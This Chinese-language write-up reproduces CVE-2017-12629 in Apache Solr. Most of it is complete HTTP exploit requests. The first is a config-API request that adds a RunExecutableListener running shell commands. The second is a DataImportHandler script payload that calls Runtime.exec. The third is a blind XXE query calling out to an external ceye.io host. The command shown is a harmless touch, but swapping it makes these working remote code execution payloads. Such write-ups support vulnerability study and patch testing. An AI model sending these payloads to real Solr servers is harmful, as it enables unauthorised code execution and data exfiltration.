# （CVE-2017-12629）Apache Solr rce&xxe 漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2824](https://www.zhihuifly.com/t/topic/2824)

# （CVE-2017-12629）Apache Solr rce&xxe 漏洞

## 一、漏洞简介

## 二、漏洞影响

Redhat Single Sign-On 7.0
+ Redhat Linux 6.2 E sparc
+ Redhat Linux 6.2 E i386
+ Redhat Linux 6.2 E alpha
+ Redhat Linux 6.2 sparc
+ Redhat Linux 6.2 i386
+ Redhat Linux 6.2 alpha
Redhat JBoss Portal Platform 6
Redhat JBoss EAP 7 0
Redhat Jboss EAP 6
Redhat JBoss Data Grid 7.0.0
Redhat Enterprise Linux 6
+ Trustix Secure Enterprise Linux 2.0
+ Trustix Secure Linux 2.2
+ Trustix Secure Linux 2.1
+ Trustix Secure Linux 2.0
Redhat Collections for Red Hat Enterprise Linux 0
Apache Solr 6.6.1
Apache Solr 6.6
Apache Solr 6.5.1
Apache Solr 6.5
Apache Solr 6.4
Apache Solr 6.3
Apache Solr 6.2
Apache Solr 6.6
Apache Solr 6.3
Apache Solr 6.0
Apache Lucene 0

## 三、复现过程

### rce 姿势一

*   首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：

```
POST /solr/demo/config HTTP/1.1
Host: 10.0.83.79:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 158 `{“add-listener”:{“event”:“postCommit”,“name”:“newlistener”,“class”:“solr.RunExecutableListener”,“exe”:“sh”,“dir”:"/bin/",“args”:["-c", “touch /tmp/success”]}}` 
```

![image](img/52b1a1102d82112805728fcf6ccd0fab.png)

在solr管理界面新建了listen

![image](img/1426776e5c8be3f15b8e13d972b695e6.png)

*   然后进行update操作，触发刚才添加的listener：

```
POST /solr/demo/update HTTP/1.1
Host: 10.0.83.79:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15 `[{“id”:“test”}]` 
```

![image](img/42e8f2bcece87a611e4e4405b2d9e775.png)

### rce 姿势二

![image](img/798637eb1295f5be662bece6f6dd4b2b.png)

如上图所示，首先打开刚刚创建好的`test`核心，选择Dataimport功能并选择debug模式，填入以下POC：

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig> 
```

点击`Execute with this Confuguration`会发送以下请求包：

payload(这里我直接填无法命令执行替换如下payload)

```
POST /solr/test/dataimport?_=1565835261600&indent=on&wt=json HTTP/1.1
Host: 10.0.83.79:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 679
Connection: close
Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr `command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%[2Fstackoverflow.com](http://2Fstackoverflow.com)%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport` 
```

![image](img/3a696fcbe8a7cd70ada3690a33882d96.png)

### xxe

由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）：

```
GET /solr/demo/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20root%20%5B%0A%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//xxe.rqe94e.ceye.io/%22%3E%0A%25remote%3B%5D%3E%0A%3Croot/%3E&wt=xml&defType=xmlparser HTTP/1.1
Host: your-ip:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close 
```

使用`ceye`

发送payload

![image](img/ede1dce47c9a99d19e95125710bc2c0e.png)

ceye接收

![image](img/68e13c99a3323a371477ae6d2b419f5e.png)

## 参考链接

> https://wh0ale.github.io/2019/08/26/Apache-Solr安全问题/